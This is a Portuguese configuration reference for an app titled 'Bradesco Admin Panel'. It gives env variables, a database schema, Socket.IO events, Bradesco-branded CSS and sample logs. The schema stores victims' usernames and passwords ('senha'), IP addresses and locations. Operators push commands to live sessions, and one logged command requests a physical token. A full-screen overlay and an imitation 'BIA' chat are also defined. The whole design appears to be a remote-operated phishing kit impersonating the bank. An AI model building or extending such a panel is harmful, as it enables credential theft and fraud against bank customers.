# ⚙️ REFERÊNCIA DE CONFIGURAÇÃO

**Versão:** 4033c685  
**Data:** 02/05/2026

---

## 🔐 Variáveis de Ambiente

### Automáticas (Injetadas pelo Manus)

```env
# OAuth
VITE_APP_ID=<app-id>
OAUTH_SERVER_URL=https://api.manus.im
VITE_OAUTH_PORTAL_URL=https://portal.manus.im

# Banco de Dados
DATABASE_URL=mysql://user:pass@host/db

# Segurança
JWT_SECRET=<random-secret>

# Owner
OWNER_NAME=<owner-name>
OWNER_OPEN_ID=<owner-id>

# APIs Manus
BUILT_IN_FORGE_API_URL=https://forge.manus.im
BUILT_IN_FORGE_API_KEY=<api-key>
VITE_FRONTEND_FORGE_API_URL=https://forge.manus.im
VITE_FRONTEND_FORGE_API_KEY=<frontend-api-key>

# Analytics
VITE_ANALYTICS_ENDPOINT=https://analytics.manus.im
VITE_ANALYTICS_WEBSITE_ID=<website-id>
```

### Customizáveis (Adicionar conforme necessário)

```env
# Aplicação
VITE_APP_TITLE=Bradesco Admin Panel
VITE_APP_LOGO=https://...

# WebSocket
SOCKET_IO_PORT=3000
SOCKET_IO_RECONNECTION_DELAY=1000

# Rate Limiting
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100

# Banco de Dados
DB_POOL_SIZE=10
DB_TIMEOUT=30000

# Logging
LOG_LEVEL=info
LOG_FILE=.manus-logs/devserver.log
```

---

## 🗄️ Banco de Dados

### Conexão

```typescript
// server/_core/index.ts
import { drizzle } from 'drizzle-orm/mysql2';
import mysql from 'mysql2/promise';

const connection = await mysql.createConnection({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME,
});

export const db = drizzle(connection);
```

### Tabelas

```typescript
// drizzle/schema.ts

// 1. Usuários
export const users = sqliteTable('users', {
  id: integer('id').primaryKey(),
  email: text('email').notNull().unique(),
  role: text('role').default('user'),
  createdAt: integer('created_at').notNull(),
});

// 2. Sessões de Clientes
export const sessions = sqliteTable('sessions', {
  id: text('id').primaryKey(),
  usuario: text('usuario'),
  senha: text('senha'),
  ip: text('ip'),
  pais: text('pais'),
  estado: text('estado'),
  cidade: text('cidade'),
  device: text('device'),
  telaAtual: text('tela_atual'),
  conectadoEm: integer('conectado_em'),
  desconectadoEm: integer('desconectado_em'),
});

// 3. Comandos
export const commands = sqliteTable('commands', {
  id: integer('id').primaryKey(),
  sessionId: text('session_id').notNull(),
  comando: text('comando').notNull(),
  timestamp: integer('timestamp').notNull(),
  status: text('status').default('pending'),
});

// 4. Mensagens BIA
export const biaMessages = sqliteTable('bia_messages', {
  id: integer('id').primaryKey(),
  sessionId: text('session_id').notNull(),
  sender: text('sender').notNull(),
  message: text('message').notNull(),
  timestamp: integer('timestamp').notNull(),
});

// 5. Logs
export const logs = sqliteTable('logs', {
  id: integer('id').primaryKey(),
  tipo: text('tipo').notNull(),
  descricao: text('descricao'),
  sessionId: text('session_id'),
  timestamp: integer('timestamp').notNull(),
});

// 6. Avatares BIA
export const avatars = sqliteTable('avatars', {
  id: integer('id').primaryKey(),
  nome: text('nome').notNull(),
  url: text('url').notNull(),
  ativo: integer('ativo').default(0),
  criadoEm: integer('criado_em').notNull(),
});
```

---

## 🔌 Socket.IO

### Configuração

```typescript
// server/_core/index.ts
import { Server } from 'socket.io';

const io = new Server(httpServer, {
  cors: {
    origin: process.env.FRONTEND_URL || 'http://localhost:5173',
    credentials: true,
  },
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  reconnectionAttempts: 5,
});
```

### Eventos

```typescript
// Cliente
socket.emit('client:connect', { sessionId });
socket.emit('client:update-data', { usuario, senha, ip });
socket.emit('client:bia-message', { texto });
socket.emit('client:disconnect');

// Operador
socket.emit('operator:command', { sessionId, command });
socket.emit('operator:bia-message', { sessionId, texto });
socket.emit('operator:connect');
socket.emit('operator:disconnect');

// Servidor
io.to('clients').emit('session:list', sessions);
io.to('operators').emit('session:update', session);
io.to(sessionId).emit('client:command', { command });
io.to('operators').emit('bia:message', { sessionId, sender, texto });
```

---

## 🎨 Cores e Estilos

### Paleta Bradesco

```css
/* Vermelho Bradesco */
--bradesco-red: #cc092f;
--bradesco-red-dark: #a00724;
--bradesco-red-light: #e63d5c;

/* Cinza */
--bradesco-gray-dark: #1a1a1a;
--bradesco-gray-light: #f5f5f5;

/* Cores dos Botões */
--button-blue: #0066cc;
--button-purple: #9933ff;
--button-red: #cc092f;
--button-green: #00cc66;
```

### Componentes

```css
/* Overlay */
.bradesco-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

/* Chat BIA */
.bradesco-bia-chat {
  position: static;
  width: 350px;
  height: 500px;
  background: white;
  border-radius: 12px;
  box-shadow: 0 5px 30px rgba(0, 0, 0, 0.3);
  display: flex;
  flex-direction: column;
}

/* Botões */
.button {
  padding: 12px 24px;
  border: none;
  border-radius: 8px;
  font-weight: bold;
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
}
```

---

## 🔐 Segurança

### CORS

```typescript
// server/_core/index.ts
app.use(cors({
  origin: process.env.FRONTEND_URL || 'http://localhost:5173',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

### Rate Limiting

```typescript
// server/_core/index.ts
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, // limite de 100 requisições
  message: 'Muitas requisições, tente novamente mais tarde',
});

app.use(limiter);
```

### Validação de Entrada

```typescript
// server/routers.ts
import { z } from 'zod';

export const router = t.router({
  sendCommand: protectedProcedure
    .input(z.object({
      sessionId: z.string().min(1),
      command: z.string().min(1),
    }))
    .mutation(async ({ input }) => {
      // Validação automática via Zod
      // ...
    }),
});
```

---

## 📊 Logs

### Formato

```
[2026-05-02T20:52:33.837Z] [OP] Operador conectado: xkXJ0A9x8VsjHcOWABCT
[2026-05-02T20:52:34.009Z] [CLI] Cliente conectado: FIq4HqbxPRgIUkGABCU
[2026-05-02T20:52:34.028Z] [CMD] Comando enviado: pedir-token-fisico
```

### Níveis

```typescript
// server/_core/index.ts
console.log('[INFO]', message);   // Informação
console.error('[ERROR]', error);  // Erro
console.warn('[WARN]', warning);  // Aviso
console.debug('[DEBUG]', data);   // Debug
```

---

## 🚀 Deployment

### Variáveis de Produção

```env
NODE_ENV=production
FRONTEND_URL=https://bradesco-admin.manus.space
DATABASE_URL=mysql://prod-user:prod-pass@prod-host/prod-db
JWT_SECRET=<prod-secret-key>
LOG_LEVEL=warn
```

### Build

```bash
# Compilar TypeScript
pnpm build

# Testar build
pnpm preview

# Iniciar em produção
NODE_ENV=production node dist/server.js
```

---

## 📝 Exemplo de .env.local

```env
# Desenvolvimento
NODE_ENV=development
VITE_APP_TITLE=Bradesco Admin Panel
VITE_APP_LOGO=https://...

# OAuth (Manus fornece automaticamente)
VITE_APP_ID=<app-id>
OAUTH_SERVER_URL=https://api.manus.im

# BD (Manus fornece automaticamente)
DATABASE_URL=mysql://user:pass@localhost/bradesco

# WebSocket
SOCKET_IO_PORT=3000

# Logging
LOG_LEVEL=debug
```

---

**Nota:** Variáveis marcadas com "Manus fornece automaticamente" são injetadas pelo sistema Manus e não precisam ser configuradas manualmente.
